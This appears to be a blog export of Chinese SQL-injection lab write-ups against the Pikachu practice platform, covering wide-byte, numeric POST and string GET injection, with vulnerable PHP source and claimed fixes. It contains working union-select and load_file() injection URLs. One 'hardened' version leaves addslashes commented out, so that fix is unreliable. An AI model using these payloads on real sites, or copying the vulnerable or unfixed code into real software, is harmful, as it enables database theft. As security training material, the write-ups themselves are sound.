//$result=mysqli_query($link, $query); $result=execute($link, $query); if(mysqli_num_rows($result) &gt;= 1)&#123; while ($data=mysqli_fetch_assoc($result))&#123; $id=$data['id']; $email=$data['email']; $html.="&lt;p class='notice'&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;"; &#125; &#125;else&#123; $html.="&lt;p class='notice'&gt;您输入的username不存在，请重新输入！&lt;/p&gt;"; &#125;&#125;?&gt; set character_set_client=gbk 是导致该漏洞的主要原因，其他代码会导致该漏洞，具体如下： 123set character_set_connection=gbk;set character_set_results=gbk;mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;); 代码加固与防护为了防止宽字节编码出现的参数问题，现在开发者基本上都会选择将MySQL连接配置为set character_set_client=binary来避免宽字节编码的问题发生。 12345678910111213141516171819202122232425262728&lt;?php$link=connect();$html='';if(isset($_POST['submit']) &amp;&amp; $_POST['name']!=null)&#123; $name = escape($link,$_POST['name']); $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合 //将MySQL连接配置为binary $set = "set character_set_client=binary"; execute($link,$set); //mysqi_query不打印错误描述 //$result=mysqli_query($link, $query); $result=execute($link, $query); if(mysqli_num_rows($result) &gt;= 1)&#123; while ($data=mysqli_fetch_assoc($result))&#123; $id=$data['id']; $email=$data['email']; $html.="&lt;p class='notice'&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;"; &#125; &#125;else&#123; $html.="&lt;p class='notice'&gt;您输入的username不存在，请重新输入！&lt;/p&gt;"; &#125;&#125;?&gt; 测试防护效果]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pikachu环境搭建]]></title>
    <url>%2F2019%2F07%2F28%2Fpikachu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[一、需求环境 Win7 64位 phpstudy 2018 pikachu-master(pikachu漏洞练习平台) 二、安装步骤 在Win7系统中安装phpStudy(官方版为一键解压包)启动phpstudy（Mysql默认用户：root，默认密码：root） 搭建pikachu漏洞练习平台将pikachu-master解压至C:\phpStudy\PHPTutorial\WWW（用于存放网页文件的目录）初始化pikachu平台访问http://127.0.0.1/pikachu-master/install.php 搭建完成，可以开始实验]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL数字型注入 （POST）]]></title>
    <url>%2F2019%2F07%2F28%2FSQL%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-POST%2F</url>
    <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika 二、实验步骤 观察注入点尝试在表单的下拉菜单中提交任意数据，观察URL与网页URL：http://192.168.31.193/pika/vul/sqli/sqli_id.php ，如图2-1所示：可以看到页面回显正常，但URL部分没有传值参数，判断该网页请求方式为POST 检测注入点该网页请求方式为POST所以我们需要用到Hackbar或者BurpSuite，这里使用Burp设置好代理后重新提交参数，并用Burp截断HTTP的报文，如图2-2所示：将该报文发送至Repeater即可开始进行注入测试，如图2-3所示：尝试在id=1参数修改为id=1 or 1=1,然后发送报文，查看Response，如图2-4所示：可以看到我们拼接的逻辑运算语句正常运行，并把数据表中的所有数据都显示出来 查询显示的字段数尝试使用order by语句判断该网页表单能够显示的字段数，如图2-5所示： 获取当前数据库及运行数据库的用户名使用union select拼接SQL语句查看用户及数据库，如图2-6所示： 三、代码理解与防范 源代码(pika\vul\sqli\sqli_id.php) 123456789101112131415161718192021&lt;?php$link=connect();$html='';if(isset($_POST['submit']) &amp;&amp; $_POST['id']!=null)&#123; //这里没有做任何处理，直接拼到select里面去了,形成Sql注入 $id=$_POST['id']; $query="select username,email from member where id=$id"; $result=execute($link, $query); //这里如果用==1,会严格一点 if(mysqli_num_rows($result)&gt;=1)&#123; while($data=mysqli_fetch_assoc($result))&#123; $username=$data['username']; $email=$data['email']; $html.="&lt;p class='notice'&gt;hello,&#123;$username&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;"; &#125; &#125;else&#123; $html.="&lt;p class='notice'&gt;您输入的user id不存在，请重新输入！&lt;/p&gt;"; &#125;&#125;?&gt; 通过判断参数类型对网页起到防护作用 1234567891011121314151617181920&lt;?php$link=connect();$html='';//&amp;&amp; id_numeric($_POST['id'])判断从网页传入的值是否为数字，如果带有其他字符将不运行后面的代码if(isset($_POST['submit']) &amp;&amp; $_POST['id']!=null &amp;&amp; id_numeric($_POST['id']))&#123; $id=$_POST['id']; //数字型注入与字符型注入不同的地方是因为id=$id并没有使用符号进行闭合 $query="select username,email from member where id=$id"; $result=execute($link, $query); if(mysqli_num_rows($result)&gt;=1)&#123; while($data=mysqli_fetch_assoc($result))&#123; $username=$data['username']; $email=$data['email']; $html.="&lt;p class='notice'&gt;hello,&#123;$username&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;"; &#125; &#125;else&#123; $html.="&lt;p class='notice'&gt;您输入的user id不存在，请重新输入！&lt;/p&gt;"; &#125;&#125;?&gt;]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL字符型注入 （GET）]]></title>
    <url>%2F2019%2F07%2F27%2FSQL%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5-GET%2F</url>
    <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar） 漏洞平台地址为：http://192.168.31.193/pika 二、SQL注入原理数据库注入漏洞，主要是开发人员在构建代码时，没有对输入边界进行安全考虑，导致攻击可以通过合法的输入点提交一些精心构造的语句，从而欺骗后台数据库进行执行，导致数据库信息泄露的一种漏洞。 三、实验步骤 观察注入点尝试在表单中提交数据 kobe 观察URL：http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=kobe&amp;submit=查询， 与网页中的表单，如图1-1所示： 检测注入点尝试在name=kobe参数后面加上 ‘ (URL编码为：%27）然后观察页面变化，URL:http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=kobe&#39;submit=查询可以看到加上之后页面内容报错，出现这种现象大多数情况下时存在注入点，如图1-2所示: 查询显示的字段数尝试使用order by语句判断该网页表单能够显示的字段数，URL:http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=1%27order+by+3+--+&amp;submit=查询， 出现“Unknown column ‘3’ in ‘order clause’” ，3表示已经超出表单的显示数量，所以该表单的字段的显示数量为2个字段，如图1-3所示： 获取当前数据库及运行数据库的用户名使用联合查询语句union select 获取当前的数据库及运行Mysql服务的用户URL:http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=1%27union+select+database(),user()+--+&amp;submit=查询 ，效果如图1-4所示： 通过SQL注入漏洞读取WEB服务器本地的文件内容使用load_file()语句读取本地C盘中的flag.txt文件内容URL：http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=1%27%20union%20select%20null,load_file(%22C:\\flag.txt%22)+--+&amp;submit=查询 ，效果如图1-5所示：flag.txt文件内容： 四、代码理解与防范 源代码(pika\vul\sqli\sqli_str.php) 123456789101112131415161718192021&lt;?php$link=connect();$html='';if(isset($_GET['submit']) &amp;&amp; $_GET['name']!=null)&#123; //这里没有做任何处理，直接拼到select里面去了 $name=$_GET['name']; //这里的变量是字符型，需要考虑闭合 $query="select id,email from member where username='$name'"; $result=execute($link, $query) ; if(mysqli_num_rows($result)&gt;=1)&#123; while($data=mysqli_fetch_assoc($result))&#123; $id=$data['id']; $email=$data['email']; $html.="&lt;p class='notice'&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;"; &#125; &#125;else&#123; $html.="&lt;p class='notice'&gt;您输入的username不存在，请重新输入！&lt;/p&gt;"; &#125;&#125;?&gt; 通过函数转义的方式对源代码进行加固 1234567891011121314151617181920212223&lt;?php$link=connect();$html='';if(isset($_GET['submit']) &amp;&amp; $_GET['name']!=null)&#123; //这里没有做任何处理，直接拼到select里面去了 $name=$_GET['name']; //addslashes()若$name所传入的字符串中带有特殊字符，则该函数会在特殊符号前添加“/”，表示将其转义 //$name = addslashes($name); //这里的变量是字符型，需要考虑闭合 $query="select id,email from member where username='$name'"; $result=execute($link, $query) ; if(mysqli_num_rows($result)&gt;=1)&#123; while($data=mysqli_fetch_assoc($result))&#123; $id=$data['id']; $email=$data['email']; $html.="&lt;p class='notice'&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;"; &#125; &#125;else&#123; $html.="&lt;p class='notice'&gt;您输入的username不存在，请重新输入！&lt;/p&gt;"; &#125;&#125;?&gt; 测试防护效果]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
</search>
